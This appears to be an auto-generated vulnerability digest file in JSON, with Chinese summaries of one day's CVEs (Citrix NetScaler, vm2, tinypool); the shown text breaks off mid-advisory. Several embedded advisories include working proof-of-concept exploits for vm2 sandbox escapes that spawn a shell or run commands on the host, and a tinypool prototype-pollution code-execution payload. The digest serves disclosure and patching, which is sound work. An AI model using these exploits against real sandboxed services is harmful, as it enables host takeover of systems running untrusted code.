@@ -1,0 +1,907 @@
+{
+  "schema_version": 1,
+  "date": "2026-10-06",
+  "generated_at": "2026-10-06T02:09:14Z",
+  "generated_by": "template",
+  "window": {
+    "from": "2026-10-05T22:00:00Z",
+    "to": "2026-10-06T22:00:00Z"
+  },
+  "stats": {
+    "scanned": 432,
+    "kept": 12,
+    "kev": 1,
+    "critical": 11,
+    "in_the_wild": 1,
+    "sources_ok": 5,
+    "sources_failed": 0
+  },
+  "sources": [
+    {
+      "name": "cisa_kev",
+      "label": "CISA KEV",
+      "ok": true,
+      "items": 1,
+      "error": null
+    },
+    {
+      "name": "nvd",
+      "label": "NVD",
+      "ok": true,
+      "items": 32,
+      "error": null
+    },
+    {
+      "name": "ghsa",
+      "label": "GitHub Advisory",
+      "ok": true,
+      "items": 395,
+      "error": null
+    },
+    {
+      "name": "vendors",
+      "label": "廠商公告",
+      "ok": true,
+      "items": 4,
+      "error": null
+    },
+    {
+      "name": "epss",
+      "label": "EPSS",
+      "ok": true,
+      "items": 0,
+      "error": null
+    }
+  ],
+  "items": [
+    {
+      "cve_id": "CVE-2026-88779",
+      "title_short": "Citrix NetScaler 88779×8.7 在野",
+      "title_full": "Citrix NetScaler CVE-2026-88779 · CVSS 8.7 · 在野利用",
+      "vendor": "Citrix",
+      "product": "NetScaler",
+      "vendor_advisory_id": null,
+      "severity": "HIGH",
+      "cvss": {
+        "version": "4.0",
+        "score": 8.7,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+      },
+      "epss": {
+        "score": 0.00534,
+        "percentile": 0.43126
+      },
+      "cwe": [
+        "CWE-119"
+      ],
+      "tags": [
+        "阻斷服務",
+        "記憶體破壞"
+      ],
+      "in_the_wild": true,
+      "kev": {
+        "date_added": "2026-10-04",
+        "due_date": "2026-10-07",
+        "ransomware": "Unknown",
+        "forensic_triage": "Yes",
+        "name_en": "Citrix NetScaler Improper Restriction of Operations within the Bounds of a Memory Buffer Vulnerability",
+        "required_action_en": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines."
+      },
+      "summary_zh": "Citrix NetScaler 存在阻斷服務、記憶體破壞漏洞，CVSS 8.7，已列入 CISA KEV 已知在野利用清單，EPSS 0.01。",
+      "impact_zh": "服務中斷，影響可用性。",
+      "action_zh": "更新至修補版本，並於邊界設備加上流量限制。",
+      "description_en": "Citrix NetScaler ADC (formerly Citrix ADC) and Citrix NetScaler Gateway (formerly Citrix Gateway) contain an improper restriction of operations within the bounds of a memory buffer vulnerability that could allow for a denial of service.",
+      "references": [
+        {
+          "name": "CISA KEV",
+          "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+        },
+        {
+          "name": "NVD",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-88779"
+        },
+        {
+          "name": "廠商公告",
+          "url": "https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX697174"
+        },
+        {
+          "name": "廠商公告",
+          "url": "https://community.citrix.com/techzone-blogs/110_security-updates/understanding-and-addressing-cve-2026-88779-in-citrix-netscaler-adc-and-citrix-netscaler-gateway/"
+        },
+        {
+          "name": "參考",
+          "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-88779"
+        }
+      ],
+      "affected_packages": [],
+      "published": "2026-10-04",
+      "modified": "2026-10-04",
+      "sources": [
+        "cisa_kev",
+        "nvd"
+      ],
+      "rank": 1,
+      "generated_by": "template",
+      "risk_score": 11.711
+    },
+    {
+      "cve_id": "CVE-2026-92955",
+      "title_short": "npm vm2 92955×10.0",
+      "title_full": "npm vm2 CVE-2026-92955 · CVSS 10.0",
+      "vendor": "npm",
+      "product": "vm2",
+      "vendor_advisory_id": "GHSA-88hf-g992-jg85",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 10.0,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      },
+      "epss": {
+        "score": 0.00712,
+        "percentile": 0.51998
+      },
+      "cwe": [
+        "CWE-913"
+      ],
+      "tags": [
+        "其他"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "npm vm2 存在安全漏洞，CVSS 10.0，EPSS 0.01。",
+      "impact_zh": "系統可能遭未授權存取或控制。",
+      "action_zh": "依廠商公告更新至最新修補版本；無法更新者請評估隔離或停用該服務。",
+      "description_en": "## Summary\n\nIt being possible to obtain the host `__proto__` getter/setter, has been used in many reports:\n\n- https://github.com/patriksimek/vm2/security/advisories/GHSA-vwrp-x96c-mhwq\n- https://github.com/patriksimek/vm2/security/advisories/GHSA-v6mx-mf47-r5wg\n- https://github.com/patriksimek/vm2/security/advisories/GHSA-grj5-jjm8-h35p\n- https://github.com/patriksimek/vm2/security/advisories/GHSA-47x8-96vw-5wg6\n\nYet it was never patched...\n\n---\n\nThis can, still, be used to escape the sandbox, one example (I'm sure there's other ways as well), is via `console._stdout`/`console._stderr` (`NodeVM` with `console: 'inherit'`, which is the default)\n\n## Details\n\nThe prototype chain for `console._stdout`/`console._stderr` is:\n\n```\n_stdout / _stderr\n-> WriteStream (TTY only)\n-> Socket\n-> Duplex\n-> Readable\n-> Stream\n-> EventEmitter\n```\n\n`process` is an `EventEmitter`, and nothing stops us from writing things to `EventEmmiter.prototype`\n\nBy overwriting `EventEmmiter.prototype.emit` with a function, and making `process` emit an event (e.g. `exit`, `unhandledRejection` etc.), we can execute code with `this` being `process`.\n\nThis also bypasses `--disallow-code-generation-from-strings`, which blocks the \"usual\" escape of obtaining the host function constructor.\n\n## PoC\n\n```js\nconst { NodeVM } = require(\"vm2\");\n\ncode = `\nconst gP = Buffer.call.call(__lookupGetter__,67,'__proto__');\n\n// vm __proto__ getter\nconsole.log(__lookupGetter__.call(0,'__proto__').call(console._stderr)); // [Object: null prototype] {}\n\n// host __proto__ getter\nconsole.log(gP.call(console._stderr)); // Socket { [...] }\n\nlet p = console._stdout;\nwhile (p.pipe) {\n\tconsole.log(p.constructor.name);\n\tp = gP.call(p);\n};\n\np.emit = function(){\n\tconsole.log(this+[]);\n\tthis.getBuiltinModule(\"child_process\").execSync(\"sh\",{stdio:\"inherit\"})\n}\n`;\n\nconst vm = new NodeVM();\nvm.run(code);\n```",
+      "references": [
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-88hf-g992-jg85"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-88hf-g992-jg85"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-92955"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/commit/22a43704c04b66823b4064b8a16fe1ad54ad0290"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/blob/v3.11.7/lib/bridge.js#L1963-L1989"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/blob/v3.11.7/lib/setup-node-sandbox.js#L437-L440"
+        }
+      ],
+      "affected_packages": [
+        "npm:vm2 (<= 3.11.7)"
+      ],
+      "published": "2026-10-05T22:47:09Z",
+      "modified": "2026-10-05T22:47:10Z",
+      "sources": [
+        "ghsa"
+      ],
+      "rank": 2,
+      "generated_by": "template",
+      "risk_score": 10.014
+    },
+    {
+      "cve_id": "CVE-2026-92934",
+      "title_short": "npm vm2 92934×9.5",
+      "title_full": "npm vm2 CVE-2026-92934 · CVSS 9.5",
+      "vendor": "npm",
+      "product": "vm2",
+      "vendor_advisory_id": "GHSA-x965-fc75-jpqh",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.5,
+        "vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      },
+      "epss": {
+        "score": 0.00762,
+        "percentile": 0.53777
+      },
+      "cwe": [
+        "CWE-693"
+      ],
+      "tags": [
+        "沙箱逃逸"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "npm vm2 存在沙箱逃逸漏洞，CVSS 9.5，EPSS 0.01。",
+      "impact_zh": "可逃逸隔離機制並影響宿主環境。",
+      "action_zh": "更新至修補版本；高風險環境建議先隔離受影響服務。",
+      "description_en": "## Summary\nvm2 `3.11.6` (this fork's latest release) contains an incomplete-fix bypass of the Error.cause host-reference sanitization added in GHSA-m283-3h24-438v (commit `7e3faaf`). Sandbox code that catches a host-wrapped `AggregateError` which is *revisited within a single `handleException` traversal* (self-cycle, mutual-cycle, or the same host aggregate referenced twice in `errors[]`) receives a live, unsanitized host proxy inside the \"sanitized\" `errors[]`, yielding full host RCE on the throw channel that the fix and Defense Invariant #3 explicitly promise to sanitize.\n\n## Root Cause\n`handleException` (`lib/setup-sandbox.js`) breaks recursion cycles at line 1819 with `if (apply(localWeakMapGet, visited, [e])) return e;` — returning the RAW host carrier on revisit. For plain-`Error` carriers this is safe because `sanitizeErrorCause`/`sanitizeHostOwnProps` seal the host object **in place** on first visit. But `sanitizeAggregateError` (~1954-1972) snapshot-and-rebuilds host-wrapped carriers into a fresh `LocalAggregateError` and does NOT seal the original in place. When such a carrier is revisited within one traversal, line 1819 hands back the still-live raw host proxy, which the rebuild re-embeds via `sanitizedArr[sanitizedArr.length] = handleException(item, visited)` (line 1965) into the \"sanitized\" `errors[]`.\n\n## Impact\nFull host RCE (`child_process.execSync`) and host info disclosure (`process.env`, `.pid`) from within the vm2 sandbox — a complete sandbox escape on the caught-exception (throw) channel.\n\n## Proof of Concept\n```js\nconst {VM} = require('vm2');\nconst vm = new VM({ sandbox: { hostThrow(){\n  const shared = new AggregateError([], 'shared');\n  shared.leak = process;                                  // incidental host ref\n  throw new AggregateError([shared, shared], 'all failed'); // same host obj twice\n}}});\nconsole.log(vm.run(`\n  try { hostThrow(); } catch (e) {\n    e.errors[1].leak.mainModule.require('child_process').execSync('id').toString();\n  }`));                                                   // -> uid=1000(...) host RCE\n```\nConfirmed vectors (all return real `id` output): AggregateError self-cycle (`agg.errors=[agg]; agg.leak=process`), duplicate-in-array (`[shared,shared]`), mutual-cycle (`a.errors=[b]; b.errors=[a]`), and nested mutual/duplicated host sub-AggregateError.\n\n## Attack Chain\n1. **Entry** — embedder exposes a host function the sandbox invokes; it throws a host-wrapped `AggregateError` carrying a host reference in a rebuild-surviving slot plus a revisit trigger (`agg.errors=[agg]; agg.leak=process`). *Guard:* none at entry (throwing from an exposed host fn is normal). *Bypass proof:* same entry class as GHSA-m283-3h24-438v (embedder-exposed throwing fn, `docs/ATTACKS.md` Category 38), accepted in scope.\n2. **Caught-exception sanitizer** — sandbox `try{hostThrow()}catch(e){…}`; transformer routes `e` through `handleException`. *Guard:* Defense Invariant #3 (Aggregate/Suppressed nested fields sanitized with cycle detection). *Bypass proof:* `handleException(agg)` marks `agg` visited (1820); proto-walk routes to `sanitizeAggregateError` (1865); host-wrapped branch reads `agg.errors` and calls `handleException(agg, visited)` on element 0 (1965); that inner call hits `visited.get(agg)===true` → `return e` (1819) → raw `agg` proxy pushed into `sanitizedArr` → becomes `newAgg.errors[0]`. The rebuild does NOT seal `agg` in place, so the returned proxy is fully live.\n3. **Sink** — `e.errors[0].leak.mainModule.require('child_process').execSync('id')`. *Guard:* bridge `get` wraps host values. *Bypass proof:* the wrap is functional, not capability-restricting; instrumented trace shows `e.errors[0].isProxy===true` yet the chain executes and returns real `uid=1000(ubuntu)...`.\n4. **Impact** — host RCE with host privileges; also `process.env`/`.pid` disclosure.\n\n## Bypass Evidence\nExecuted on node v22.23, vm2 `3.11.6`:\n- Baseline vector `throw new Error('x',{cause:process})` (plain Error `.cause`) → BLOCKED\n- Plain Error own-prop `e.leak=process` (non-cyclic) → BLOCKED\n- Non-cyclic host `AggregateError` w/ own-prop or single host sub-error leak → BLOCKED\n- **AggregateError self-cycle / duplicate-in-array / mutual-cycle / nested → RCE (`uid=1000(ubuntu)…`)**\n\nEvery non-cyclic shape and the exact baseline `cause` vector are blocked; only the revisited host `AggregateError` leaks — proving the fix is present but this input shape evades it (INCOMPLETE FIX BYPASS, not a duplicate). Instrumented trace: `outerLeakType=\"undefined\"` (outer rebuilt safe), `isErrors0Proxy=true` (element 0 is a live host proxy), `rce=uid=1000(ubuntu)…`.\n\n## Affected Versions\n`<= 3.11.6`. The bug exists from the sanitization fix (`7e3faaf`, tag `3.11.6`) onward — an incomplete-fix bypass exists only where the fix exists. `git diff 3.11.6 HEAD -- lib/setup-sandbox.js` is empty (HEAD identical).\n\n## Scope Note\nThis advisory covers the **AggregateError** family only. A `SuppressedError` variant does NOT reproduce (`se.error` returns undefined; RCE blocked) and is excluded.\n\n## Suggested Fix\nOn the cycle short-circuit (line 1819), return the memoized sandbox-realm *replacement* (keyed in `visited`) rather than the raw carrier; OR seal host-wrapped `AggregateError`/`SuppressedError` carriers in place *before* recursing into sub-errors, mirroring the plain-carrier `sanitizeHostOwnProps` invariant.\n\n---\nReported by **zx (Jace)** — GitHub: @manus-use",
+      "references": [
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-x965-fc75-jpqh"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-x965-fc75-jpqh"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-92934"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/commit/c8c232530b860cfecf6f94bc8d0d0890aa381460"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.8"
+        },
+        {
+          "name": "參考",
+          "url": "https://www.vulncheck.com/advisories/vm2-before-3.11.8-sandbox-escape-rce-via-aggregateerror"
+        }
+      ],
+      "affected_packages": [
+        "npm:vm2 (<= 3.11.7)"
+      ],
+      "published": "2026-10-05T22:38:04Z",
+      "modified": "2026-10-05T22:38:05Z",
+      "sources": [
+        "ghsa"
+      ],
+      "rank": 3,
+      "generated_by": "template",
+      "risk_score": 9.515
+    },
+    {
+      "cve_id": "CVE-2026-104848",
+      "title_short": "npm tinypool 104848×9.5",
+      "title_full": "npm tinypool CVE-2026-104848 · CVSS 9.5",
+      "vendor": "npm",
+      "product": "tinypool",
+      "vendor_advisory_id": "GHSA-5gmw-xhrv-c9v3",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.5,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      },
+      "epss": {
+        "score": 0.00497,
+        "percentile": 0.4046
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "tags": [
+        "RCE"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "npm tinypool 存在RCE漏洞，CVSS 9.5，EPSS 0.00。",
+      "impact_zh": "遠端程式碼執行，攻擊者可完全控制受影響系統。",
+      "action_zh": "優先更新至修補版本；無法更新者請限制邊界存取或停用該介面。",
+      "description_en": "`tinypool` passes worker options to `new Worker()` by reading them off a plain object whose prototype is `Object.prototype`. Options the application did not set are resolved through the prototype chain and then passed explicitly to `worker_threads.Worker`.\n\nNode core ignores `Worker` options inherited from `Object.prototype`. By reading them and passing them explicitly, tinypool re-materialises them as own properties and defeats that protection.\n\n\nTwo keys reach code execution:\n\n1. **`execArgv`** — polluting `Object.prototype.execArgv = ['--require', '/path/to/attacker.js']` causes every pool worker to load the attacker's script.\n2. **`env`** — polluting `Object.prototype.env = { NODE_OPTIONS: '--require /path/to/attacker.js' }` achieves the same via environment injection.\n\n## Root cause\n\n`dist/index.js` lines 508-511:\n\n```js\nenv:            this.options.env,\nargv:           this.options.argv,\nexecArgv:       this.options.execArgv,\nresourceLimits: this.options.resourceLimits,\n```\n\n`this.options` is built at line 470 via object spread:\n\n```js\nthis.options = { ...kDefaultOptions, ...options, filename, maxQueue: 0 };\n```\n\n## Impact\n\nArbitrary code execution inside every worker the pool spawns, with the privileges of the host process. Because tinypool is the worker pool behind Vitest (~42M downloads/week), the natural blast radius is developer machines and CI runners — an attacker who lands a prototype-pollution primitive anywhere in the dependency tree gets code execution in the build/test pipeline, which is a supply-chain foothold (access to CI secrets, signing keys, artifact publishing).\n\n\n## Proof of concept\n\nMinimal reproduction (3 files):\n\n**worker.mjs** — the application's own legitimate worker:\n```js\nexport default function double(n) { return n * 2 }\n```\n\n**payload.js** — attacker-controlled code (never referenced by the app):\n```js\nconst fs = require('fs')\nfs.writeFileSync('/tmp/RCE_PROOF.txt', 'code execution achieved, pid=' + process.pid)\nconsole.log('*** RCE ***')\n```\n\n**app.js** — normal tinypool usage:\n```js\nconst path = require('path')\n\n// Simulates an upstream PP source (lodash/qs/minimist/set-value/deepmerge)\nObject.prototype.execArgv = ['--require', path.join(__dirname, 'payload.js')]\n\nconst { Tinypool } = require('tinypool')\nconst pool = new Tinypool({\n  filename: path.join(__dirname, 'worker.mjs'),\n  minThreads: 1, maxThreads: 1\n})\npool.run(21).then(r => {\n  console.log('pool returned:', r)  // 42 — app works normally\n  pool.destroy()\n})\n```\n\nRun:\n```\nnpm i tinypool@2.1.0\nnode app.js\ncat /tmp/RCE_PROOF.txt   # attacker's code ran\n```\n\nBoth `execArgv` and `env` vectors confirmed on Node 20.\n\n\n## Suggested fix\n\nResolve worker options with own-property semantics:\n\n```js\nthis.options = Object.assign(Object.create(null),\n  kDefaultOptions, options, { filename, maxQueue: 0 });\n```",
+      "references": [
+        {
+          "name": "GitHub Advisory",
+          "url": "https://github.com/advisories/GHSA-5gmw-xhrv-c9v3"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/tinylibs/tinypool/security/advisories/GHSA-5gmw-xhrv-c9v3"
+        },
+        {
+          "name": "參考",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-104848"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/tinylibs/tinypool/pull/134"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/tinylibs/tinypool/commit/24df4e730e7d0857a6d226c9b58f8924227404fd"
+        },
+        {
+          "name": "參考",
+          "url": "https://github.com/tinylibs/tinypool/releases/tag/v2.1.1"
+        }
+      ],
+      "affected_packages": [
+        "npm:tinypool (<= 2.1.0)"
+      ],
+      "published": "2026-10-05T22:50:01Z",
+      "modified": "2026-10-05T22:50:02Z",
+      "sources": [
+        "ghsa"
+      ],
+      "rank": 4,
+      "generated_by": "template",
+      "risk_score": 9.51
+    },
+    {
+      "cve_id": "CVE-2026-100721",
+      "title_short": "npm vm2 100721×9.5",
+      "title_full": "npm vm2 CVE-2026-100721 · CVSS 9.5",
+      "vendor": "npm",
+      "product": "vm2",
+      "vendor_advisory_id": "GHSA-5h3f-q97h-ccvc",
+      "severity": "CRITICAL",
+      "cvss": {
+        "version": "4.0",
+        "score": 9.5,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      },
+      "epss": {
+        "score": 0.004,
+        "percentile": 0.31905
+      },
+      "cwe": [
+        "CWE-863"
+      ],
+      "tags": [
+        "權限提升",
+        "阻斷服務"
+      ],
+      "in_the_wild": false,
+      "kev": null,
+      "summary_zh": "npm vm2 存在權限提升、阻斷服務漏洞，CVSS 9.5，EPSS 0.00。",
+      "impact_zh": "攻擊者可將權限提升至更高層級。",
+      "action_zh": "套用廠商修補，並檢查本機是否出現異常提權行為。",
+      "description_en": "## Summary\n\nAt source revision `91034466bfb7f56b95fd48083ec6ca36d058f164` of vm2 3.11.8, an untrusted `NodeVM` guest can turn one allowlisted custom-resolved module into authorization for a separate file whose path merely shares the resolved path's string prefix. `LegacyResolver.customResolve` stores the resolved path in `this.externals` as `^<path>` without an end or separator boundary; a later absolute require of a sibling such as `foo2/index.js` therefore passes the external check and is loaded through `hostRequire` when the configured context is `host`. The decisive attack loaded `foo` as `FOO_OK` and then executed the prefix-sharing sibling, which returned `PREFIX_PWN` after invoking `child_process`; an otherwise identical control denied the sibling with `ENOTFOUND`.\n\n## Technical Details\n\nThe affected configuration is a documented `NodeVM` use in which the embedder sets `require.external` to `{modules: ['foo'], transitive: false}`, supplies a custom resolver that returns the `foo` directory, sets a root directory, and uses `context: 'host'`. The guest controls the `require` specifiers and requests the allowlisted bare name before requesting the absolute path of the prefix-sharing sibling. The test entry point is deliberately outside the configured root so ordinary `node_modules` lookup misses and the custom resolver is consulted.\n\nThe source-to-sink path is:\n\n- `NodeVM.run` executes guest code and creates the module-specific `require` function at `lib/nodevm.js:516-575`.\n- `DefaultResolver.resolveFull` searches normal locations and then dispatches a miss to `customResolve` at `lib/resolver.js:227-316`.\n- `LegacyResolver.customResolve` checks the bare specifier against the external cache, calls the embedder's resolver, and appends an authorization regular expression at `lib/resolver-compat.js:266-291`.\n- `isPathAllowedForModule` falls back to `this.externals.some(regex => regex.test(path))` at `lib/resolver-compat.js:193-215`. The dynamically appended expression `^/…/node_modules/foo` also matches `/…/node_modules/foo2/index.js` because no path separator or end-of-string condition is required.\n- `loadJS` uses `this.hostRequire(filename)` for a host-context file and only wraps the returned exports with `vm.readonly` at `lib/resolver-compat.js:255-263`. Top-level effects of the required file therefore occur in the host process before the exports are wrapped.\n\nThe relevant current code has the same flaw for both supported custom-resolver return shapes:\n\n```js\nif (typeof resolved === 'string') {\n\tthis.externals.push(new RegExp('^' + escapeRegExp(resolved)));\n\treturn this.loadAsFileOrDirectory(resolved, extList);\n}\nconst {module=x, path: resolvedPath} = resolved;\nthis.externals.push(new RegExp('^' + escapeRegExp(resolvedPath)));\nreturn this.loadNodeModules(module, [resolvedPath], extList);\n```\n\nThe existing anchored bare-specifier matcher and the separator-aware `mod.path` check address different authorization states. They do not constrain the new `this.externals` entries created after custom resolution. The violated invariant is that a resolved allowlisted path may authorize only that exact path and its descendants after a path separator, never a sibling selected by raw string prefix.\n\n## PoV\n\nThe minimal guest operation is to load the configured bare name and then request the separate absolute sibling path:\n\n```js\nconst foo = require('foo');\nmodule.exports = {\n\tfoo,\n\tsibling: require('/tmp/vm2-prefix-case/node_modules/foo2/index.js')\n};\n```\n\nThe corresponding embedder configuration is:\n\n```js\nconst vm = new NodeVM({\n\trequire: {\n\t\texternal: {modules: ['foo'], transitive: false},\n\t\troot: '/tmp/vm2-prefix-case',\n\t\tcontext: 'host',\n\t\tresolve(name) {\n\t\t\treturn name === 'foo'\n\t\t\t\t? '/tmp/vm2-prefix-case/node_modules/foo'\n\t\t\t\t: undefined;\n\t\t}\n\t}\n});\n```\n\nThe sibling is not itself allowlisted. Its successful load is the authorization violation; the `child_process` call in its top-level code demonstrates that the file ran in the host context rather than as guest-only code.\n\n## PoC\n\nFrom a checkout of the repository, use the pinned revision and install its declared dependencies without lifecycle scripts:\n\n```sh\ngit checkout 91034466bfb7f56b95fd48083ec6ca36d058f164\nnpm ci --ignore-scripts\n```\n\nSave the following harness as `/tmp/custom-resolve-prefix.js`:\n\n```js\n'use strict';\n\nconst path = require('path');\nconst { NodeVM } = require(process.cwd() + '/lib/main.js');\n\nconst [, , mode, fooIndexPath, siblingPath] = process.argv;\nconst fooDir = path.dirname(fooIndexPath);\nconst root = path.resolve(fooDir, '../..');\nconst entry = path.join(path.dirname(root), 'entry.js');\nlet customCalls = 0;\n\nfunction runGuest(code) {\n\treturn new NodeVM({\n\t\trequire: {\n\t\t\texternal: {modules: ['foo'], transitive: false},\n\t\t\troot,\n\t\t\tcontext: 'host',\n\t\t\tresolve(moduleName) {\n\t\t\t\tif (moduleName === 'foo') {\n\t\t\t\t\tcustomCalls++;\n\t\t\t\t\treturn fooDir;\n\t\t\t\t}\n\t\t\t\treturn undefined;\n\t\t\t}\n\t\t}\n\t}).run(code, entry);\n}\n\nconst record = {mode, result: 'invalid'};\n\ntry {\n\tif (mode === 'candidate') {\n\t\tconst output = runGuest(`\n\t\t\tconst foo = require('foo');\n\t\t\tmodule.exports = {foo, sibling: require(${JSON.stringify(siblingPath)})};\n\t\t`);\n\t\trecord.output = output;\n\t\tif (output && output.foo === 'FOO_OK' && output.sibling === 'PREFIX_PWN') {\n\t\t\trecord.result = 'violation';\n\t\t\trecord.signal = 'prefix-sharing sibling executed in host context after custom resolution: PREFIX_PWN';\n\t\t} else {\n\t\t\trecord.result = 'pass';\n\t\t}\n\t} else if (mode === 'control') {\n\t\ttry {\n\t\t\trunGuest(`module.exports = require(${JSON.stringify(siblingPath)});`);\n\t\t\trecord.result = 'violation';\n\t\t\trecord.signal = 'prefix-sharing sibling loaded before custom resolution';\n\t\t} catch (error) {\n\t\t\trecord.result = 'pass';\n\t\t\trecord.denial = String(error && (error.code || error.message) || error);\n\t\t}\n\t} else {\n\t\trecord.error = 'unknown mode';\n\t}\n} catch (error) {\n\trecord.result = 'invalid';\n\trecord.error = String(error && (error.stack || error.message) || error);\n}\n\nrecord.customCalls = customCalls;\nconsole.log(JSON.stringify(record));\n```\n\nCreate the two neutral fixture modules. The first is the configured module; the second is a separate sibling whose name shares the first module's path prefix:\n\n```sh\nmkdir -p /tmp/vm2-prefix-case/node_modules/foo /tmp/vm2-prefix-case/node_modules/foo2\ncat > /tmp/vm2-prefix-case/node_modules/foo/index.js <<'EOF'\n'use strict';\nmodule.exports = 'FOO_OK';\nEOF\ncat > /tmp/vm2-prefix-case/node_modules/foo2/index.js <<'EOF'\n'use strict';\nmodule.exports = require('child_process').execFileSync(\n\tprocess.execPath,\n\t['-e', \"process.stdout.write('PREFIX_PWN')\"]\n).toString();\nEOF\n```\n\nRun the attack and then the negative control from the repository checkout:\n\n```sh\nnode /tmp/custom-resolve-prefix.js candidate \\\n  /tmp/vm2-prefix-case/node_modules/foo/index.js \\\n  /tmp/vm2-prefix-case/node_modules/foo2/index.js\nnode /tmp/custom-resolve-prefix.js control \\\n  /tmp/vm2-prefix-case/node_modules/foo/index.js \\\n  /tmp/vm2-prefix-case/node_modules/foo2/index.js\n```\n\nThe decisive results were:\n\n```text\n{\"mode\":\"candidate\",\"result\":\"violation\",\"output\":{\"foo\":\"FOO_OK\",\"sibling\":\"PREFIX_PWN\"},\"signal\":\"prefix-sharing sibling executed in host context after custom resolution: PREFIX_PWN\",\"customCalls\":1}\n{\"mode\":\"control\",\"result\":\"pass\",\"denial\":\"ENOTFOUND\",\"customCalls\":0}\n```\n\nBoth executions completed successfully with return code 0 in an offline `node:bookworm` runtime. The attack reached `LegacyResolver.customResolve` once, while the control reached it zero times. The `foo2` fixture can use `child_process` only because the target loaded it through the host-context path; the same absolute request without the preceding custom resolution was denied.\n\n## Impact\n\nThis is a sandbox authorization bypass crossing from untrusted guest JavaScript into the host process. A service that runs attacker-controlled JavaScript in a `NodeVM` with a custom external resolver can be induced to load an existing prefix-sharing host file that was not allowlisted, despite `transitive: false`. The demonstrated sibling executes `child_process` at top level and returns a host-generated marker, showing host code execution rather than a guest-only exception or denial of service. The exploit requires the application to use this custom-resolver/host-context configuration and for a readable prefix-sharing file to exist; the tested claim is limited to that deployment shape and does not assert that every vm2 installation is affected. This is CWE-863 (Incorrect Authorization), with CVSS 3.1 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`: after the stated deployment preconditions, the guest needs only low-complexity module requests, no additional host privilege or user interaction, and the impact crosses into host confidentiality, integrity, and availability.\n\n## Suggested Fix\n\nMake every custom-resolver-derived authorization entry path-boundary aware. The smallest correction is to require either the exact resolved path or a path separator followed by a descendant, for both the string result and the `{path: resolvedPath}` result:\n\n```js\nconst externalPath = value => new RegExp(\n\t'^' + escapeRegExp(value) + '(?:[\\\\/].*)?$'\n);\n```\n\nUse `externalPath(resolved)` at the string-return branch and `externalPath(resolvedPath)` at the object-return branch. A path-aware canonical comparison shared with `isPathAllowedForModule` is preferable if the resolver filesystem supports it, because it can consistently handle separators and normalization. The fix must not rely only on the bare-specifier matcher: the bypass occurs after that matcher has already accepted `foo` and after `customResolve` has appended a new regex.\n\nAdd regression coverage that configures `external: {modules: ['foo'], transitive: false}`, a custom resolver returning `foo`, and `context: 'host'`; it should require `foo` and then assert that the absolute `foo2/index.js` sibling is denied and cannot emit a host marker. Keep a negative-control case that requests the sibling without first resolving `foo`, and add positive cases for the exact resolved file and legitimate descendants. Exercise both custom-resolver return forms so neither `this.externals.push` branch can reintroduce the prefix authorization.\n\n## Affected Package/Versions\n\n- Package: `vm2` in the npm ecosystem.\n- Tested package version: `3.11.8`, at source revision `91034466bfb7f56b95fd48083ec6ca36d058f164`.\n- Affected version range tested: `pinned-revision-91034466bfb7f56b95fd48083ec6ca36d058f164`.\n- Current head: the pinned revision is vulnerable, as shown by the attack/control pair above.\n- Patched versions: none identified by the tested evidence.\n- Only the pinned revision was tested; no broader historical range or fixed revision or release is claimed.\n\n## Advisory History\n\nThe closest public match is [GHSA-7q3f-wx44-378m](https://github.com/patriksimek/vm2/security/advisories/GHSA-7q3f-wx44-378m), titled “External module allowlist uses a raw prefix test, so a prefix-sharing sibling package is treated as allowlisted.” That advisory concerns the 